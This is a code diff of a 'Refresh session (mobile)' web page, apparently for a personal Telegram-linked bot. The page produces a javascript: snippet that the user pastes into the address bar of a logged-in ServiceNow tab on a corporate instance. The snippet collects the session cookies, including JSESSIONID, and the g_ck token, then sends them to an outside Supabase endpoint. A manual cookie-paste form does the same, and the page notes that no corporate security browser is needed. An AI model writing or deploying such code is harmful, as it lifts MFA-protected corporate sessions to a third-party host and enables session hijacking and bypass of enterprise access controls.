@@ -14,53 +14,58 @@
     button.green{background:#059669}
     button.purple{width:100%;padding:12px;border:none;border-radius:10px;background:#7c3aed;color:#fff;font-weight:600;font-size:1rem}
     input,textarea{width:100%;padding:10px;border-radius:8px;border:1px solid #475569;background:#0f172a;color:#e2e8f0;margin:6px 0;font-size:14px}
-    .ok{color:#4ade80}.err{color:#f87171}
+    .ok{color:#4ade80}.err{color:#f87171}.warn{color:#fbbf24}
     small{color:#94a3b8}
     #err{display:none}
     ol{padding-left:1.2rem;margin:8px 0}
     li{margin:10px 0}
+    .tip{background:#0f172a;border-left:3px solid #38bdf8;padding:10px 12px;margin:10px 0;border-radius:6px}
   </style>
 </head>
 <body>
-  <h1>🔄 Refresh session (manual)</h1>
+  <h1>🔄 Refresh session (mobile)</h1>
   <p id="err" class="err"></p>
   <div id="app" style="display:none">
     <p><small>One-time link from Telegram — do not save.</small></p>
+    <div class="tip">
+      Use <strong>Safari</strong> or <strong>Chrome</strong> on your phone. No Prisma Access Browser needed.
+    </div>
     <div class="card">
-      <div class="step">Step 1 — Login to ServiceNow</div>
-      <p><small>Tap when you're ready. Complete MFA yourself.</small></p>
+      <div class="step">Step 1 — Login & open queue</div>
+      <p><small>Complete MFA. Wait until you <strong>see ticket rows</strong>.</small></p>
       <a class="btn" id="snow" href="#">Open ServiceNow queue</a>
     </div>
     <div class="card">
       <div class="step">Step 2 — Upload session</div>
       <ol>
-        <li>While on the <strong>ServiceNow page</strong>, come back here</li>
-        <li>Tap <strong>Copy session script</strong></li>
-        <li>Paste in Safari <strong>address bar</strong> on ServiceNow tab → Go</li>
-        <li>✅ Telegram confirmation</li>
+        <li>On the <strong>ServiceNow queue tab</strong>, tap <strong>Copy session script</strong> below</li>
+        <li>Paste in the <strong>address bar</strong> on that same ServiceNow tab → Go</li>
+        <li>Wait for ✅ alert, then check Telegram</li>
       </ol>
       <button type="button" class="primary green" id="copyScript">📋 Copy session script</button>
       <p id="copyMsg"></p>
     </div>
     <div class="card">
-      <div class="step">Or paste cookie manually</div>
-      <textarea id="cookie" rows="3" placeholder="Cookie string"></textarea>
-      <input id="gck" placeholder="g_ck token"/>
-      <button type="button" class="purple" id="submit">Upload session</button>
+      <div class="step">Manual fallback</div>
+      <p><small>Paste full cookie if script fails (must include JSESSIONID).</small></p>
+      <textarea id="cookie" rows="3" placeholder="JSESSIONID=...; UX-Token=..."></textarea>
+      <input id="gck" placeholder="g_ck token (optional)"/>
+      <button type="button" class="purple" id="submit">Upload manually</button>
       <p id="msg"></p>
     </div>
   </div>
   <script>
     const SUPABASE_URL = 'https://qhkeirrhjjtdyvrdkbxn.supabase.co';
     const ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InFoa2VpcnJoamp0ZHl2cmRrYnhuIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzY4MjY0MjEsImV4cCI6MjA5MjQwMjQyMX0.vgHg7uMrhaZ2YwKhmBKxrgmHzm83Ze3gD3XapXpGACc';
-    const SNOW_URL = 'https://micron.service-now.com/now/nav/ui/classic/params/target/sn_si_incident_list.do%3Fsysparm_query%3Dactive%253Dtrue%255Eassignment_groupDYNAMICd6435e965f510100a9ad2572f2b47744%26sysparm_first_row%3D1%26sysparm_view%3D';
+    const SNOW_QUEUE_URL = 'https://micron.service-now.com/now/nav/ui/classic/params/target/sn_si_incident_list.do%3Fsysparm_query%3Dactive%253Dtrue%255Eassignment_groupDYNAMICd6435e965f510100a9ad2572f2b47744%26sysparm_first_row%3D1%26sysparm_view%3D';
+    const SNOW_QUERY = 'active=true^assignment_groupDYNAMICd6435e965f510100a9ad2572f2b47744';
     const token = new URLSearchParams(location.search).get('t');
     const errEl = document.getElementById('err');
+    const rpc = SUPABASE_URL + '/rest/v1/rpc/upload_session_with_token';
 
     function sessionScript(tok) {
-      const rpc = SUPABASE_URL + '/rest/v1/rpc/upload_session_with_token';
-      const js = `(function(){var t=${JSON.stringify(tok)};var rpc=${JSON.stringify(rpc)};var k=${JSON.stringify(ANON_KEY)};var g=window.g_ck||(document.body.innerHTML.match(/g_ck\\s*=\\s*['"]([^'"]+)['"]/)||[])[1]||'';fetch(rpc,{method:'POST',headers:{'Content-Type':'application/json','apikey':k,'Authorization':'Bearer '+k},body:JSON.stringify({p_token:t,p_cookie:document.cookie,p_g_ck:g})}).then(r=>r.json()).then(d=>alert(d.ok?'✅ Done! Check Telegram.':('❌ '+(d.error||'Failed')))).catch(e=>alert('❌ '+e))})();`;
-      return 'javascript:' + encodeURIComponent(js);
+      const inline = `(async function(){var t=${JSON.stringify(tok)};var rpc=${JSON.stringify(rpc)};var k=${JSON.stringify(ANON_KEY)};var q=${JSON.stringify(SNOW_QUERY)};var g=window.g_ck||(document.body.innerHTML.match(/g_ck\\s*=\\s*['"]([^'"]+)['"]/)||[])[1]||'';if(!g)throw new Error('Open the queue link first and login');var tu='/api/now/table/sn_si_incident?sysparm_query='+encodeURIComponent(q)+'&sysparm_limit=1&sysparm_fields=number';var te=await fetch(tu,{credentials:'include',headers:{'X-UserToken':g,'Accept':'application/json'}});if(!te.ok)throw new Error('API test failed '+te.status+' — login on queue page first');var parts={};document.cookie.split(';').forEach(function(p){var i=p.indexOf('=');if(i>0)parts[p.slice(0,i).trim()]=p.slice(i+1).trim()});try{if(window.cookieStore&&cookieStore.getAll){var all=await cookieStore.getAll();all.forEach(function(c){if(c.name&&(!c.domain||c.domain.indexOf('service-now')>=0))parts[c.name]=c.value})}}catch(e){}var cookie=Object.keys(parts).map(function(n){return n+'='+parts[n]}).join('; ');if(!/JSESSIONID=/.test(cookie))throw new Error('Missing JSESSIONID — use Chrome or Safari, open queue link, login, retry');var r=await fetch(rpc,{method:'POST',headers:{'Content-Type':'application/json','apikey':k,'Authorization':'Bearer '+k},body:JSON.stringify({p_token:t,p_cookie:cookie,p_g_ck:g})});var d=await r.json();if(!d.ok)throw new Error(d.error||'Upload failed');alert('✅ Done! Check Telegram.')})().catch(function(e){alert('❌ '+e.message)});`;
+      return 'javascript:' + encodeURIComponent(inline);
     }
 
     if (!token) {
@@ -68,12 +73,11 @@
       errEl.textContent = 'Missing link. Use the latest Telegram session-failed alert.';
     } else {
       document.getElementById('app').style.display = 'block';
-      document.getElementById('snow').href = SNOW_URL;
-      const rpc = SUPABASE_URL + '/rest/v1/rpc/upload_session_with_token';
-      const script = sessionScript(token);
+      document.getElementById('snow').href = SNOW_QUEUE_URL;
 
       document.getElementById('copyScript').onclick = async () => {
         const cm = document.getElementById('copyMsg');
+        const script = sessionScript(token);
         try {
           if (navigator.clipboard && navigator.clipboard.writeText) await navigator.clipboard.writeText(script);
           else {
@@ -84,7 +88,7 @@
             document.execCommand('copy');
             document.body.removeChild(ta);
           }
-          cm.textContent = '✅ Copied! Paste in Safari address bar on ServiceNow tab → Go';
+          cm.textContent = '✅ Copied! On ServiceNow tab: paste in address bar → Go';
           cm.className = 'ok';
         } catch (e) {
           cm.textContent = '❌ Copy failed — use manual paste below';
@@ -95,11 +99,15 @@
       document.getElementById('submit').onclick = async () => {
         const msg = document.getElementById('msg');
         msg.textContent = 'Uploading...';
+        const cookie = document.getElementById('cookie').value.trim();
+        const gck = document.getElementById('gck').value.trim();
+        if (!cookie) { msg.textContent = '❌ Paste cookie first'; msg.className = 'err'; return; }
+        if (!/JSESSIONID=/.test(cookie)) { msg.textContent = '❌ Cookie must include JSESSIONID'; msg.className = 'err'; return; }
         try {
           const r = await fetch(rpc, {
             method: 'POST',
-            headers: { 'Content-Type': 'application/json', 'apikey': ANON_KEY, 'Authorization': 'Bearer ' + ANON_KEY },
-            body: JSON.stringify({ p_token: token, p_cookie: document.getElementById('cookie').value.trim(), p_g_ck: document.getElementById('gck').value.trim() }),
+            headers: { 'Content-Type': 'application/json', apikey: ANON_KEY, Authorization: 'Bearer ' + ANON_KEY },
+            body: JSON.stringify({ p_token: token, p_cookie: cookie, p_g_ck: gck }),
           });
           const d = await r.json();
           msg.textContent = d.ok ? '✅ ' + (d.message || 'Updated') : '❌ ' + (d.error || 'Failed');
